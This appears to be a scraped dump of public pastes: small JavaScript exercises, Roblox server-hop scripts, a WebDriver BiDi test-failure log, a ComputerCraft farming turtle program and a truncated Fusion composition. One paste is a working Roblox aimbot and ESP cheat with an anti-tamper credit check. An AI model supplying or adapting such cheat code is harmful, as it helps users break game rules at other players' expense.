        editBtn.dataset.event = eventName.value;
        editBtn.dataset.note = note.value;
        editBtn.dataset.date = date.value;
        editBtn.addEventListener('click', onEdit);

        let doneBtn = document.createElement('button');
        doneBtn.className = 'btn done';
        doneBtn.textContent = 'Done';
        doneBtn.addEventListener('click', onDone);

        let buttonsContainer = li.querySelector('.buttons');
        buttonsContainer.appendChild(editBtn);
        buttonsContainer.appendChild(doneBtn);

        e.target.parentElement.reset();
    }

    function onEdit(e) {
        eventName.value = e.target.dataset.event;
        note.value = e.target.dataset.note;
        date.value = e.target.dataset.date;

        e.target.closest('li').remove();
    }

    function onDone(e) {
        let li = e.target.closest('li')

        li.querySelector('.buttons').remove();
        eventList.appendChild(li);
    }

    function onDelete() {
        eventList.replaceChildren();
    }

    function create(tag, children, className) {
        let el = document.createElement(tag);
        if (className) {
            el.className = className;
        }
        children.forEach(child => {
            if (typeof child === 'object') {
                el.appendChild(child);
            } else {
                el.appendChild(document.createTextNode(child));
            }
        });

        return el;
    }
}"
1qheynyG,01-Space-Exploration-Crew-Management,Onesible,JavaScript,Tuesday 8th of April 2025 01:25:50 PM CDT,"function solve(arr) {
    let n = Number(arr.shift());
    let crew = new Map();

    for (let i = 0; i < n; i++) {
        let [name, section, skills] = arr.shift().split(' ');
        crew.set(name, { section, skills: skills.split(',') });
    }
    console.log(crew)

    while (arr[0] !== 'End') {
        let tokens = arr.shift().split(' / ');
        let command = tokens[0];
        let name = tokens[1];
        
        switch (command) {
            case 'Perform':
                let section = tokens[2];
                let skill = tokens[3];
                
                if (crew.get(name).section === section && crew.get(name).skills.includes(skill)) {
                    console.log(`${name} has successfully performed the skill: ${skill}!`);
                } else {
                    console.log(`${name} cannot perform the skill: ${skill}.`);
                }
                break;
                
            case 'Transfer':
                let newSection = tokens[2];
                crew.get(name).section = newSection;
                console.log(`${name} has been transferred to: ${newSection}`);
                break;
                
            case 'Learn Skill':
                let newSkill = tokens[2];
                
                if (crew.get(name).skills.includes(newSkill)) {
                    console.log(`${name} already knows the skill: ${newSkill}.`);
                } else {
                    crew.get(name).skills.push(newSkill);
                    console.log(`${name} has learned a new skill: ${newSkill}.`);
                }
                break;
        }
    }

    for (let [name, data] of crew) {
        console.log(`Astronaut: ${name}, Section: ${data.section}, Skills: ${data.skills.sort().join(', ')}`);
    }
}
"
Tbmzndze,Untitled,Zynee,Lua,Tuesday 8th of April 2025 01:12:53 PM CDT,"local TeleportService = game:GetService(""TeleportService"")
local HttpService = game:GetService(""HttpService"")
local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer

            local function getServerList()
                local servers = {}
                local success, result = pcall(function()
                    return HttpService:JSONDecode(game:HttpGet(""https://games.roblox.com/v1/games/"" .. game.PlaceId .. ""/servers/Public?sortOrder=Asc&limit=100""))
                end)
                if success then
                    for _, server in pairs(result.data) do
                        if server.playing < server.maxPlayers then
                            table.insert(servers, {id = server.id, players = server.playing})
                        end
                    end
                    table.sort(servers, function(a, b) return a.players < b.players end)
                end
                return servers
            end

            local function serverHop()
                local servers = getServerList()
                if #servers > 0 then
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[1].id, LocalPlayer)
                else
                   print(""error"") 
                end
            end

         serverHop()"
Xvqs6paK,Untitled,Zynee,Lua,Tuesday 8th of April 2025 01:12:08 PM CDT,"local HTTPService = game:GetService(""HttpService"")
            local TeleportService = game:GetService(""TeleportService"")
            local StatsService = game:GetService(""Stats"")

            local function fetchServersData(placeId, limit)
                local url = string.format(""https://games.roblox.com/v1/games/%d/servers/Public?limit=%d"", placeId, limit)
                local success, response = pcall(function()
                    return HTTPService:JSONDecode(game:HttpGet(url))
                end)

                if success and response and response.data then
                    return response.data
                end

                return nil
            end

            local placeId = game.PlaceId
            local serverLimit = 100
            local servers = fetchServersData(placeId, serverLimit)

            if not servers then
                return
            end

            local lowestPingServer = servers[1]

            for _, server in pairs(servers) do
                if server[""ping""] < lowestPingServer[""ping""] and server.maxPlayers > server.playing then
                    lowestPingServer = server
                end
            end

            TeleportService:TeleportToPlaceInstance(placeId, lowestPingServer.id)
      end"
56bqMbeF,Roblox Universal Aimbot Script,bonrwild,Lua,Tuesday 8th of April 2025 12:53:12 PM CDT,"--[[
    Script created by Alex Gaming
    YouTube/Discord/Other: [Optional Contact Info or Channel Link]
    Please do not re-upload or redistribute without credit.
]]

local teamCheck = false
local fov = 120
local lockPart = ""HumanoidRootPart""
local aimbotEnabled = false
local espEnabled = true
local headAimEnabled = false
local currentTarget = nil
local currentTargetDistance = ""N/A""
local themeColor = Color3.fromRGB(0, 122, 255)

local RunService = game:GetService(""RunService"")
local Players = game:GetService(""Players"")
local UserInputService = game:GetService(""UserInputService"")
local Camera = workspace.CurrentCamera

-- **ESP Variables**
local highlightedPlayers = {}

-- **Create Highlight Function**
local function createHighlight(player)
    local function setupHighlight(character)
        if character:FindFirstChild(""HumanoidRootPart"") then
            local highlight = Instance.new(""Highlight"")
            highlight.Adornee = character
            highlight.FillColor = themeColor
            highlight.FillTransparency = 0.5
            highlight.OutlineColor = Color3.new(1, 1, 1)
            highlight.OutlineTransparency = 0.3
            highlight.Enabled = espEnabled
            highlight.Parent = character

            highlightedPlayers[player] = highlight
        else
            task.delay(1, function()
                if character and character:FindFirstChild(""HumanoidRootPart"") then
                    setupHighlight(character)
                end
            end)
        end
    end

    if player.Character then
        setupHighlight(player.Character)
    end

    player.CharacterAdded:Connect(function(character)
        wait(0.5)
        setupHighlight(character)
    end)
end

local function removeHighlight(player)
    if highlightedPlayers[player] then
        highlightedPlayers[player]:Destroy()
        highlightedPlayers[player] = nil
    end
end

RunService.RenderStepped:Connect(function()
    if espEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            if not highlightedPlayers[player] and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                createHighlight(player)
            elseif highlightedPlayers[player] then
                highlightedPlayers[player].Enabled = espEnabled
            end
        end
    end
end)

local function getClosestTarget()
    local closestTarget = nil
    local shortestDistance = math.huge
    local screenCenter = Camera.ViewportSize / 2
    local playerPosition = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") and Players.LocalPlayer.Character[""HumanoidRootPart""].Position or Vector3.new(0, 0, 0)

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer and player.Character then
            local targetPart = headAimEnabled and player.Character:FindFirstChild(""Head"") or player.Character:FindFirstChild(""HumanoidRootPart"")
            local humanoid = player.Character:FindFirstChild(""Humanoid"")
            if targetPart and humanoid and humanoid.Health > 0 then
                local distanceFromPlayer = (playerPosition - targetPart.Position).Magnitude
                local screenPoint, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
                local distanceOnScreen = (Vector2.new(screenPoint.X, screenPoint.Y) - screenCenter).Magnitude

                if onScreen and distanceOnScreen < shortestDistance and distanceOnScreen <= fov then
                    if not teamCheck or player.Team ~= Players.LocalPlayer.Team then
                        closestTarget = player
                        shortestDistance = distanceOnScreen
                        currentTargetDistance = math.floor(distanceFromPlayer)
                    end
                end
            end
        end
    end
    return closestTarget
end

local function lockOnTarget()
    if currentTarget and currentTarget.Character then
        local targetPart = headAimEnabled and currentTarget.Character:FindFirstChild(""Head"") or currentTarget.Character:FindFirstChild(""HumanoidRootPart"")
        if targetPart then
            local targetVelocity = targetPart.Velocity or Vector3.new(0, 0, 0)
            local predictionFactor = math.clamp(0.05 + (currentTargetDistance / 2000), 0.02, 0.1)
            local predictedPosition = targetPart.Position + (targetVelocity * predictionFactor)
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, predictedPosition), 0.2)
        else
            currentTarget = nil
        end
    end
end

RunService.RenderStepped:Connect(function()
    if aimbotEnabled then
        if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
            if not currentTarget then
                currentTarget = getClosestTarget()
            end
            if currentTarget then
                lockOnTarget()
            end
        else
            currentTarget = nil
        end
    end
end)

local function createGUI()
    if game.CoreGui:FindFirstChild(""Aimlock_GUI"") then
        game.CoreGui.Aimlock_GUI:Destroy()
    end

    local ScreenGui = Instance.new(""ScreenGui"")
    ScreenGui.Name = ""Aimlock_GUI""
    ScreenGui.Parent = game.CoreGui

    local Frame = Instance.new(""Frame"", ScreenGui)
    Frame.Size = UDim2.new(0, 200, 0, 190)
    Frame.Position = UDim2.new(1, -220, 0, 50)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.BorderSizePixel = 2
    Frame.BorderColor3 = themeColor

    local creditLabel = Instance.new(""TextLabel"", Frame)
    creditLabel.Size = UDim2.new(0, 180, 0, 20)
    creditLabel.Position = UDim2.new(0, 10, 0, 0)
    creditLabel.BackgroundTransparency = 1
    creditLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    creditLabel.TextScaled = true
    creditLabel.Text = ""Made by Alex Gaming""
    creditLabel.Name = ""CreditLabel""

    -- 🔒 Anti-tamper Check
    task.spawn(function()
        while true do
            if creditLabel.Text ~= ""Made by Alex Gaming"" then
                warn(""Credit tampering detected! Disabling script."")
                aimbotEnabled = false
                espEnabled = false
                headAimEnabled = false
                if ScreenGui then
                    ScreenGui:Destroy()
                end
                break
            end
            wait(2)
        end
    end)

    local function createButton(name, position, text, callback)
        local button = Instance.new(""TextButton"", Frame)
        button.Size = UDim2.new(0, 180, 0, 22)
        button.Position = UDim2.new(0, 10, 0, position)
        button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        button.BorderSizePixel = 2
        button.BorderColor3 = themeColor
        button.Text = text
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.TextScaled = true

        button.MouseButton1Click:Connect(function()
            callback(button)
        end)
        return button
    end

    createButton(""Aimlock"", 30, ""Aimlock: OFF"", function(button)
        aimbotEnabled = not aimbotEnabled
        button.Text = aimbotEnabled and ""Aimlock: ON"" or ""Aimlock: OFF""
    end)

    createButton(""Head Aim"", 60, ""Head Aim: OFF"", function(button)
        headAimEnabled = not headAimEnabled
        button.Text = headAimEnabled and ""Head Aim: ON"" or ""Head Aim: OFF""
    end)

    createButton(""ESP"", 90, ""ESP: ON"", function(button)
        espEnabled = not espEnabled
        button.Text = espEnabled and ""ESP: ON"" or ""ESP: OFF""
    end)

    createButton(""Theme Color"", 120, ""Change Theme"", function(button)
        themeColor = themeColor == Color3.fromRGB(0, 122, 255) and Color3.fromRGB(255, 165, 0) or Color3.fromRGB(0, 122, 255)
        Frame.BorderColor3 = themeColor
    end)

    local distanceLabel = Instance.new(""TextLabel"", Frame)
    distanceLabel.Size = UDim2.new(0, 180, 0, 20)
    distanceLabel.Position = UDim2.new(0, 10, 0, 150)
    distanceLabel.BackgroundTransparency = 1
    distanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    distanceLabel.TextScaled = true
    distanceLabel.Text = ""Distance: N/A""

    RunService.RenderStepped:Connect(function()
        distanceLabel.Text = ""Distance: "" .. tostring(currentTargetDistance) .. ""m""
    end)
end

createGUI()"
NRDqjNKS,Untitled,Temidayo12,Bash,Tuesday 8th of April 2025 12:37:31 PM CDT,"/webdriver/tests/bidi/browser/set_client_window_state/invalid.py
  FAIL test_client_window_width_invalid_bounds[2147483649] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e', bound = 2147483649

    @pytest.mark.parametrize(""bound"", [-1, MAX_INT + 1])
    async def test_client_window_width_invalid_bounds(bidi_session, first_window_id, bound):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
bound      = 2147483649
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:86: Failed
  FAIL test_client_window_height_invalid_bounds[2147483649] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e', bound = 2147483649

    @pytest.mark.parametrize(""bound"", [-1, MAX_INT + 1])
    async def test_client_window_height_invalid_bounds(bidi_session, first_window_id, bound):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
bound      = 2147483649
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:104: Failed
/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py
  FAIL test_move_xy - assert 450 == 800
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_move_xy(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            x=100,
            y=200
        )
        assert result[""state""] == ""normal""
        assert result[""x""] == 100
        assert result[""y""] == 200
>       assert result[""width""] == initial_window_state[""width""]
E       assert 450 == 800

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 100,
 'y': 200}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:17: AssertionError
  FAIL test_move_x - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_move_x(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            x=100
        )
        assert result[""state""] == ""normal""
        assert result[""x""] == 100
>       assert result[""y""] == initial_window_state[""y""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 100,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:28: AssertionError
  FAIL test_move_y - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_move_y(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            y=200
        )
        assert result[""state""] == ""normal""
        assert result[""y""] == 200
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 0,
 'y': 200}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:40: AssertionError
  FAIL test_resize_width_height - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_resize_width_height(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            width=800,
            height=600
        )
        assert result[""state""] == ""normal""
        assert result[""width""] == 800
        assert result[""height""] == 600
        # Verify other values haven't changed
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:55: AssertionError
  FAIL test_resize_width - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_resize_width(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            width=800
        )
        assert result[""state""] == ""normal""
        assert result[""width""] == 800
        # Verify other values haven't changed
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 800,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:67: AssertionError
  FAIL test_resize_height - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_resize_height(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            height=600
        )
        assert result[""state""] == ""normal""
        assert result[""height""] == 600
        # Verify other values haven't changed
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 450,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:80: AssertionError
  FAIL test_no_position_resize - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_no_position_resize(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL
        )
        assert result[""state""] == ""normal""
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:90: AssertionError
/webdriver/tests/bidi/browser/set_client_window_state/state.py
  FAIL test_set_client_window_state_transitions[m-to-i-f-to-u] - AssertionError: assert 'minimized' == 'fullscreen'
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f733d5f3e50>, initial_state = 'minimized'
target_state = 'fullscreen', first_window_id = '8e307b10-bcb8-40de-81db-1a1c3215b4b9'

    @pytest.mark.parametrize(
        ""initial_state,target_state"",
        [
            (""fullscreen"", ""normal""),
            (""fullscreen"", ""maximized""),
            (""fullscreen"", ""minimized""),

            (""maximized"", ""fullscreen""),
            (""maximized"", ""normal""),
            (""maximized"", ""minimized""),

            (""minimized"", ""fullscreen""),
            (""minimized"", ""maximized""),
            (""minimized"", ""normal""),

            (""normal"", ""fullscreen""),
            (""normal"", ""maximized""),
            (""normal"", ""minimized""),
        ],
        ids=lambda states: f""{states[0]}-to-{states[1]}""
    )
    @pytest.mark.asyncio
    async def test_set_client_window_state_transitions(bidi_session, initial_state, target_state, first_window_id):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=initial_state
        )
        assert result[""state""] == initial_state

        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=target_state
        )
>       assert result[""state""] == target_state
E       AssertionError: assert 'minimized' == 'fullscreen'
E
E         - fullscreen
E         + minimized

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f733d5f3e50>
first_window_id = '8e307b10-bcb8-40de-81db-1a1c3215b4b9'
initial_state = 'minimized'
result     = {'active': True,
 'clientWindow': '8e307b10-bcb8-40de-81db-1a1c3215b4b9',
 'height': 600,
 'state': 'minimized',
 'width': 800,
 'x': 100,
 'y': 100}
target_state = 'fullscreen'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/state.py:36: AssertionError
/webdriver/tests/bidi/browser/set_client_window_state/stress.py
  TIMEOUT /webdriver/tests/bidi/browser/set_client_window_state/stress.py
 1:28.66 INFO Got 4 unexpected results, with 0 unexpected passes
 1:28.67 wptserve INFO Stopped WebTransport over HTTP/3 server on 127.0.0.1:11000
 1:28.70 wptserve INFO Stopped http server on 127.0.0.1:8003
 1:28.70 wptserve INFO Close on: (<AddressFamily.AF_INET: 2>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('127.0.0.1', 8888))
 1:28.84 wptserve INFO Stopped http server on 127.0.0.1:8443
 1:28.85 wptserve INFO Stopped http server on 127.0.0.1:8445
 1:28.85 wptserve INFO Stopped http server on 127.0.0.1:8444
 1:28.89 wptserve INFO Close on: (<AddressFamily.AF_INET: 2>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('127.0.0.1', 8889))
 1:29.02 wptserve INFO Stopped http server on 127.0.0.1:9000
 1:29.07 wptserve INFO Stopped http server on 127.0.0.1:8446
 1:29.07 wptserve INFO Stopped http server on 127.0.0.1:8002
 1:29.10 wptserve INFO Stopped http server on 127.0.0.1:8000
 1:29.16 wptserve INFO Stopped http server on 127.0.0.1:8001
 1:29.23 INFO Removed font: Ahem.ttf
 1:29.29 INFO Closing logging queue
 1:29.29 INFO queue closed"
bF7GQigx,ccFarm,Te-ki,Lua,Tuesday 8th of April 2025 12:34:17 PM CDT,"local plantsDb = {}

-- Save / Load
local filePath = ""ccFarm.save""
local function save()
	local savedFile = fs.open(filePath, ""w"")
	savedFile.write(textutils.serialize(plantsDb))
	savedFile.flush()
	savedFile.close()
end
local function load()
	if fs.exists(filePath) and fs.getSize(filePath) > 0 then
		local savedFile = fs.open(filePath, ""r"")
		plantsDb = textutils.unserialize(savedFile.readAll())
		savedFile.close()
    end
end
load()

-- Message handling
local monitor = term.current()
local sizeX, sizeY = monitor.getSize()
local lastMsg = """"
local lastMsgCount = 0
local function logMsg(msg)
	monitor.setCursorPos(1,13)
	monitor.clearLine()
	if lastMsg == msg then
		lastMsgCount = lastMsgCount + 1
		msg = msg .. "" "" .. lastMsgCount
	else
		lastMsg = msg
		lastMsgCount = 0
		monitor.scroll(1)
	end
	monitor.setCursorPos(1,12)
	monitor.clearLine()
	monitor.write(msg)
	monitor.setCursorPos(1,13)
end
local function msg(msg)
	monitor.setCursorPos(1,13)
	monitor.clearLine()
	monitor.write(msg)
end

-- Setup
local tArgs = { ... }
if #tArgs < 1 then
    local programName = arg[0] or fs.getName(shell.getRunningProgram())
    logMsg(""To start farming type:"")
    logMsg(programName .. "" <1>"")
    logMsg(""<1>: the size of the farm."")
    logMsg(""The size can be 0 to 8."")
    logMsg(""Turtle must be at the center of the farm."")
    logMsg(""With size 0 turtle consume no fuel and will mine in a cross shaped pattern :"")
    logMsg("" X "")
    logMsg(""XTX"")
    logMsg("" X "")
    return 0
end
local farmSize = tArgs[1] + 0

local function isSeed(itemName)
    return string.match(itemName, ""_seeds$"") ~= nil
end

local function selectSeedsSlot(seedName)
    if seedName ~= nil then
        local otherSeedSlot = 0
        for slot = 1, 16 do
            local itemDetail = turtle.getItemDetail(slot)
            if itemDetail ~= nil and itemDetail.name == seedName then
                turtle.select(slot)
                return true
            elseif itemDetail ~= nil and isSeed(itemDetail.name) then
                otherSeedSlot = slot
            end
        end
		if otherSeedSlot > 0 then
            turtle.select(otherSeedSlot)
            return true
		end
    end
	for slot = 1, 16 do
		local itemDetail = turtle.getItemDetail(slot)
		if itemDetail ~= nil and isSeed(itemDetail.name) then
            turtle.select(slot)
            return true
		end
	end
    return false
end

local function getTurtleInventory()
    local inventory = {}
	for slot = 1, 16 do
		inventory[slot] = turtle.getItemDetail(slot)
	end
    return inventory
end

local function compareInventories(firstInventory, secondInventory)
    local items = {}
	for slot = 1, 16 do
        if firstInventory[slot] ~= nil then
            items[firstInventory[slot].name] = (items[firstInventory[slot].name] or 0) - firstInventory[slot].count
        end
        if secondInventory[slot] ~= nil then
            items[secondInventory[slot].name] = (items[secondInventory[slot].name] or 0) + secondInventory[slot].count
        end
	end
    for key, value in pairs(items) do
        if value == 0 then
            items[key] = nil
        end
    end
    return items
end

local function findCrop(itemList)
    local crop = nil
    local totalItems = 0
    for name, count in pairs(itemList) do
        if count > 0 then
            totalItems = totalItems + count
            if isSeed(name) or crop == nil then
                crop = name
            end
        end
    end
    return crop, totalItems
end

local function plantSeed(seedName)
    local success = false
    if selectSeedsSlot(seedName) then
        success = turtle.place()
        turtle.select(1)
    else
        logMsg(""No more seeds!"")
    end
    return success
end
local function harvest()
    if turtle.detect() then
        while turtle.dig() do
            while turtle.suck() do
            end
        end
    end
end

if farmSize == 0 then
    while true do
        local success, plantData = turtle.inspect()
        if success and plantData.state then
            local plant = plantsDb[plantData.name] or {seedName = nil, maxAge = 1, needTest = true}
            if plantData.state.age >= plant.maxAge then
                local oldInventory = nil
                if plant.needTest == true then
                    logMsg(""Analyzing "" .. plantData.name .. "" stage "" .. plantData.state.age)
                    oldInventory = getTurtleInventory()
                end
                harvest()
                if plant.needTest == true then
                    local newInventory = getTurtleInventory()
                    local newItems = compareInventories(oldInventory, newInventory)
                    local seedName, itemsCount = findCrop(newItems)
                    if seedName ~= nil then
                        plant.seedName = seedName
                        plantsDb[plantData.name] = plant
                    end
                    if itemsCount > 1 then
                        plant.maxAge = plantData.state.age
                        plant.needTest = false
                        logMsg(plantData.name .. "" is now fully known."")
                    else
                        plant.maxAge = plantData.state.age + 1
                    end
                    save()
                end
                plantSeed(plant.seedName)
            end
        end
        turtle.turnRight()
        sleep(0)
    end
end
"
Q6jLHTei,Particle text cloud,marcusa3000,Lua,Tuesday 8th of April 2025 12:15:43 PM CDT,"{
	Tools = ordered() {
		Camera3D2 = Camera3D {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = -0.53148289629741, },
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.831476236085091, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 4.42, },
				[""Transform3DOp.Rotate.X""] = Input { Value = 15.5999975204468, },
				[""Transform3DOp.Rotate.Y""] = Input { Value = -6.6, },
				FLength = Input { Value = 18.2123442718302, },
				[""Stereo.Mode""] = Input { Value = FuID { ""OffAxis"" }, },
